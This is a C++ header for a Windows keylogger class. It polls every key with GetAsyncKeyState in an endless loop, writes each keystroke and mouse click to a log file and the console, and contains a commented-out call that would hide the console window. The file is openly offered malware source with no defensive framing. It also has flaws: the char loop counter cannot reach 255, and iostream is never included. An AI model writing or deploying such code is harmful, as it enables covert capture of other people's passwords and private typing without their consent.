#pragma once

#include <fstream>
#include <string>
#include <Windows.h>
#include <fstream>

class KeyLogger
{
public:

    std::string_view m_filename;
    int m_sleep = 10;

    //KeyLogger() = default;

	void record_loop()
	{
        //FreeConsole();

        while (true) {
            Sleep(m_sleep);
            record();

        }
	}

    void record() {
        for (char i = 8; i <= 255; i++) {
            //GetKeyboardState();

            if (GetAsyncKeyState(i)) {
                Save(i, m_filename);
            }
        }

    }


    int Save(int _key, std::string_view filename) {

        //Sleep(m_sleep);

        std::fstream file;
        file.open(filename, std::fstream::out | std::fstream::app);

        auto key_log = [&](auto&& msg) {
            std::cout << msg << std::endl;
            file << msg << std::endl;
        };

        switch (_key)
        {
        case VK_SHIFT: key_log("[SHIFT]");
            break;
        case VK_BACK: key_log("[BACKSPACE]");
            break;
        case VK_LBUTTON: key_log("[LBUTTON]");
            break;
        case VK_RBUTTON: key_log("[RBUTTON]");
            break;
        case VK_RETURN: key_log("[ENTER]");
            break;
        case VK_TAB: key_log("[TAB]");
            break;
        case VK_ESCAPE: key_log("[ESCAPE]");
            break;
        case VK_CONTROL: key_log("[Ctrl]");
            break;
        case VK_MENU: key_log("[Alt]");
            break;
        case VK_CAPITAL: key_log("[CAPS Lock]");
            break;
        case VK_SPACE: key_log("[SPACE]");
            break;
        default:
            key_log(static_cast<char>(_key));
        }
        
       
        return 0;
    }



};